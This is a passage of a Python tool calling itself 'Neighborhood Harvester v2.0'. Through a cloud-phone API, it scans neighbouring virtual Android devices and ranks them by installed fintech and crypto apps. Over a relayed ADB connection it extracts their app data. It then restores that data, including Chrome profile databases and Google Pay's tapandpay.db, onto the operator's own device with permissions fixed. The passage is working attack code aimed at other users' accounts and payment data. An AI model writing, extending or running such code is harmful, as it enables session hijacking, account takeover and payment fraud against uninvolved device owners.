                        uid = uid_dump.split("userId=")[1].split()[0]
                    except (IndexError, ValueError):
                        pass

            if uid:
                print(f"    Fixing permissions (uid={uid})...")
                adb(our_dev, f"chown -R {uid}:{uid} {data_dir}/", 10)
                adb(our_dev, f"chmod -R 770 {data_dir}/", 5)
                adb(our_dev, f"restorecon -R {data_dir}/ 2>/dev/null", 5)
                app_log["permissions"] = True
            else:
                print(f"    Could not determine UID, skipping chown")
                app_log["permissions"] = False

        # 5. Verify
        verify = adb(our_dev, f"ls {data_dir}/databases/ 2>/dev/null | wc -l", 5)
        app_log["db_count"] = int(verify) if verify.strip().isdigit() else 0
        print(f"    Verified: {app_log['db_count']} databases")

        app_log["status"] = "restored"
        restore_log["apps"][pkg] = app_log

    # ═══ RESTORE CHROME DATA ═══
    chrome_dir = os.path.join(backup_dir, "chrome")
    if os.path.exists(chrome_dir):
        print(f"\n  ── Restoring Chrome Data ──")
        adb(our_dev, "am force-stop com.android.chrome", 5)
        await asyncio.sleep(0.5)
        chrome_data = "/data/data/com.android.chrome/app_chrome/Default"
        for db_file in os.listdir(chrome_dir):
            local = os.path.join(chrome_dir, db_file)
            remote_name = db_file.replace("_", " ").replace(".db", "")
            remote = f"{chrome_data}/{remote_name}"
            if adb_push(our_dev, local, remote, 30):
                print(f"    Pushed {db_file}")
        # Fix Chrome permissions
        if our_root:
            chrome_uid = adb(our_dev, "stat -c '%u' /data/data/com.android.chrome 2>/dev/null", 5)
            if chrome_uid and chrome_uid.isdigit():
                adb(our_dev, f"chown -R {chrome_uid}:{chrome_uid} {chrome_data}/", 10)

    # ═══ RESTORE TAPANDPAY ═══
    tapandpay_local = os.path.join(backup_dir, "tapandpay.db")
    if os.path.exists(tapandpay_local):
        print(f"\n  ── Restoring TapAndPay ──")
        remote = "/data/data/com.google.android.gms/databases/tapandpay.db"
        if adb_push(our_dev, tapandpay_local, remote, 30):
            print(f"    tapandpay.db pushed")
            if our_root:
                gms_uid = adb(our_dev,
                    "stat -c '%u' /data/data/com.google.android.gms 2>/dev/null", 5)
                if gms_uid and gms_uid.isdigit():
                    adb(our_dev, f"chown {gms_uid}:{gms_uid} {remote}", 5)

    # Save restore log
    restore_log["status"] = "complete"
    restore_log["timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")
    os.makedirs("tmp", exist_ok=True)
    with open(RESTORE_LOG, "w") as f:
        json.dump(restore_log, f, indent=2)

    print(f"\n{'═'*70}")
    print(f"  ✓ RESTORE COMPLETE")
    print(f"  Apps restored: {sum(1 for a in restore_log['apps'].values() if a.get('status') == 'restored')}")
    print(f"  Log: {RESTORE_LOG}")
    print(f"{'═'*70}")


# ═══════════════════════════════════════════════════════════════════════
# PHASE 5: AUTO MODE (scan → pick → extract → restore)
# ═══════════════════════════════════════════════════════════════════════

async def auto_mode(client: VMOSCloudClient, hosts: list[str]):
    """Full automatic pipeline: scan → rank → extract top targets → offer restore."""
    print(f"\n{'╔'+'═'*68+'╗'}")
    print(f"  ║  NEIGHBORHOOD HARVESTER v2.0 — AUTO MODE                        ║")
    print(f"  ║  Scan → Rank → Extract → Restore                               ║")
    print(f"  {'╚'+'═'*68+'╝'}")

    # Step 1: Scan
    print(f"\n  [PHASE 1] Scanning {len(hosts)} neighbor hosts...")
    results = await scan_all(client, hosts)

    # Step 2: Pick
    print(f"\n  [PHASE 2] Selecting targets...")
    targets = pick_targets(results)
    if not targets:
        print("  No targets selected. Exiting.")
        return

    print(f"\n  Selected {len(targets)} targets for extraction")

    # Step 3: Extract
    print(f"\n  [PHASE 3] Full extraction...")
    all_reports = {}
    for i, target in enumerate(targets, 1):
        print(f"\n  ═══ TARGET {i}/{len(targets)} ═══")
        report = await extract_full_backup(client, target)
        all_reports[target["ip"]] = report
        await asyncio.sleep(3)

    # Save master report
    os.makedirs("tmp", exist_ok=True)
    with open("tmp/harvest_master_report.json", "w") as f:
        json.dump(all_reports, f, indent=2, default=str)

    # Step 4: Offer restore
    print(f"\n{'═'*70}")
    print(f"  EXTRACTION COMPLETE — {len(all_reports)} targets harvested")
    extracted = [ip for ip, r in all_reports.items() if r.get("status") == "extracted"]
    print(f"  Successfully extracted: {len(extracted)}")
    for ip in extracted:
        r = all_reports[ip]
        apps = [a for a in r.get("apps", {}).values() if a.get("access") != "denied"]
        print(f"    {ip}: {len(apps)} apps extracted")

    if extracted:
        print(f"\n  Restore to our device? Enter IP or 'all' or 'skip':")
        try:
            choice = input("  > ").strip()
        except (EOFError, KeyboardInterrupt):
            choice = "skip"

        if choice == "skip":
            print("  Restore skipped.")
        elif choice == "all":
            for ip in extracted:
                await restore_to_device(client, ip)
                await asyncio.sleep(2)
        elif choice in extracted:
            await restore_to_device(client, choice)
        else:
            print(f"  Invalid choice: {choice}")

    print(f"\n  ✓ HARVESTER COMPLETE")


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

async def main():
    import argparse
    parser = argparse.ArgumentParser(description="Neighborhood Harvester v2.0")
    parser.add_argument("action", choices=["scan", "pick", "extract", "restore", "auto"],
                        help="scan=scan all | pick=select targets | extract=backup device | "
                             "restore=push to our device | auto=full pipeline")
    parser.add_argument("target", nargs="?", help="Target IP (for extract/restore)")
    parser.add_argument("--top", type=int, default=20, help="Auto-select top N targets")
    args = parser.parse_args()

    client = VMOSCloudClient(ak=AK, sk=SK, base_url="https://api.vmoscloud.com")

    # Load hosts
    if os.path.exists(HOSTS_FILE):
        with open(HOSTS_FILE) as f:
            hosts = [h.strip() for h in f.readlines()
                     if h.strip() and h.strip() != OUR_IP and len(h.strip().split(".")) == 4]
    else:
        print(f"[!] {HOSTS_FILE} not found. Run deep_extractor.py first to discover hosts.")
        return

    print(f"[*] Loaded {len(hosts)} neighbor hosts from {HOSTS_FILE}")

    if args.action == "scan":
        results = await scan_all(client, hosts)
        scanned = [r for r in results if r.get("status") == "scanned"]
        scored = [r for r in scanned if r.get("score", 0) > 0]
        print(f"\n  Scanned: {len(scanned)} | With fintech/crypto: {len(scored)}")
        print(f"  Results saved to {SCAN_RESULTS}")

    elif args.action == "pick":
        if not os.path.exists(SCAN_RESULTS):
            print("[!] No scan results. Run 'scan' first.")
            return
        with open(SCAN_RESULTS) as f:
            results = json.load(f)
        targets = pick_targets(results)
        if targets:
            print(f"\n  Selected {len(targets)} targets:")
            for t in targets:
                print(f"    {t['ip']:18s} {t.get('brand',''):10s} {t.get('model',''):20s} score={t.get('score',0)}")

    elif args.action == "extract":
        if not args.target:
            print("[!] Provide target IP: extract <IP>")
            return
        # Build target info
        if os.path.exists(SCAN_RESULTS):
            with open(SCAN_RESULTS) as f:
                results = json.load(f)
            target = next((r for r in results if r["ip"] == args.target), None)
        else:
            target = None

        if not target:
            # Quick scan the target first
            print(f"  Quick scanning {args.target}...")
            target = {"ip": args.target, "high_value": [], "fintech": [], "score": 0}
            # Do a quick scan inline
            if await deploy_relay(client, args.target):
                await asyncio.sleep(0.6)
                dev = connect_relay()
                await asyncio.sleep(0.3)
                raw = adb(dev, "pm list packages", 12)
                pkgs = [l.replace("package:", "").strip() for l in raw.split("\n") if "package:" in l]
                score, hv, fin = score_pkgs(pkgs)
                target.update({
                    "brand": adb(dev, "getprop ro.product.brand", 4),
                    "model": adb(dev, "getprop ro.product.model", 4),
                    "android": adb(dev, "getprop ro.build.version.release", 4),
                    "score": score, "high_value": hv, "fintech": fin,
                    "all_pkgs": pkgs, "shell": "root" if "uid=0" in adb(dev, "id", 4) else "shell"
                })
                disconnect_relay()
                await kill_relay(client)

        await extract_full_backup(client, target)

    elif args.action == "restore":
        if not args.target:
            print("[!] Provide source IP: restore <IP>")
            return
        await restore_to_device(client, args.target)

    elif args.action == "auto":
        await auto_mode(client, hosts)


if __name__ == "__main__":
    asyncio.run(main())
